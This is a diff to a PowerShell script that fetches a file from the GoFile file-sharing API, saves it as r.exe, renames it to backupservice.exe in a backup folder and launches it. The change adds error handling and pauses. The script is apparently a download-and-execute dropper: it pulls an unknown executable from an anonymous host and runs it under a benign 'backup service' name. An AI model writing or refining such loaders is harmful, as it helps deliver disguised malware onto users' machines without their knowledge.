@@ -1,3 +1,6 @@
+# Keep console open and show errors
+$ErrorActionPreference = "Stop"
+
 # Variables
 $ContentID = "SplUgh"
 $OutFile = "$env:USERPROFILE\Downloads\r.exe"
@@ -6,19 +9,40 @@ $BackupFile = "$BackupDir\backupservice.exe"
 
 Write-Host "Getting file info from GoFile..."
 
-# Download JSON response
-$response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID"
+try {
+    # Download JSON response safely
+    $response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID"
+} catch {
+    Write-Host "Failed to download JSON. Check your internet connection."
+    Pause
+    exit
+}
 
-# Extract download URL from JSON
-$URL = $response.data.contents | Where-Object { $_.name -like "*" } | Select-Object -ExpandProperty downloadPage
+# Check if data exists
+if (-not $response.data.contents) {
+    Write-Host "No contents found in the JSON response."
+    Pause
+    exit
+}
+
+# Attempt to extract download URL
+$URL = $response.data.contents | Where-Object { $_.name -like "*" } | Select-Object -ExpandProperty downloadPage -ErrorAction SilentlyContinue
 
 if (-not $URL) {
-    Write-Error "Download URL not found!"
+    Write-Host "Download URL not found!"
+    Pause
     exit
 }
 
 Write-Host "Downloading from $URL ..."
-Invoke-WebRequest -Uri $URL -OutFile $OutFile
+
+try {
+    Invoke-WebRequest -Uri $URL -OutFile $OutFile
+} catch {
+    Write-Host "Failed to download the file."
+    Pause
+    exit
+}
 
 # Ensure backup folder exists
 if (-not (Test-Path -Path $BackupDir)) {
@@ -26,7 +50,17 @@ if (-not (Test-Path -Path $BackupDir)) {
 }
 
 # Move and rename downloaded file
-Move-Item -Path $OutFile -Destination $BackupFile -Force
+try {
+    Move-Item -Path $OutFile -Destination $BackupFile -Force
+} catch {
+    Write-Host "Failed to move or rename the file."
+    Pause
+    exit
+}
 
 # Run the backup service
+Write-Host "Starting backup service..."
 Start-Process -FilePath $BackupFile
+
+Write-Host "Done!"
+Pause
